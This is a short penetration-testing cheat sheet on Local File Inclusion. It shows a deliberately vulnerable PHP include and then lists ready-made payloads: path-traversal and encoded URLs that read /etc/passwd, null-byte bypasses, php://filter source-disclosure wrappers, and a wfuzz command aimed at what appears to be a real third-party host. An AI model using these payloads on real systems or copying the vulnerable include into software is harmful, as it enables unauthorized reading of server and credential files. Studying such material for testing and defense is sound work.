# 📂 LFI

## Local File Inclusions (LFI)&#x20;

{% hint style="info" %}
An attacker can use **Local File Inclusion** (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even XSS.&#x20;

Typically, LFI occurs when an application uses the **path to a file as input**. If the application treats this input as trusted, a local file may be used in the include statement.
{% endhint %}

### Check for LFI

The following is an example of **PHP code that is vulnerable to LFI**.

```php
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
```

* **GET** parameter in url

{% embed url="https://github.com/kurobeats/fimap" %}
Tool to check LFI
{% endembed %}

### Example

```
http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
```

#### WFuzz

```bash
wfuzz -c -w list-lfi.txt --hc 404,400 --hw 0 https://metabase.peren.fr/api/geojson?url=file:///FUZZ
```

### PHP Filter

* Used to read **.PHP files**. It is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. We can use the PHP filter to display the content of PHP files in other encoding formats such as base64 or ROT13.

**Commands**

```
http://example.com/page.php?file=php://filter/resource=/etc/passwd

http://example.com/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd

http://example.com/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```
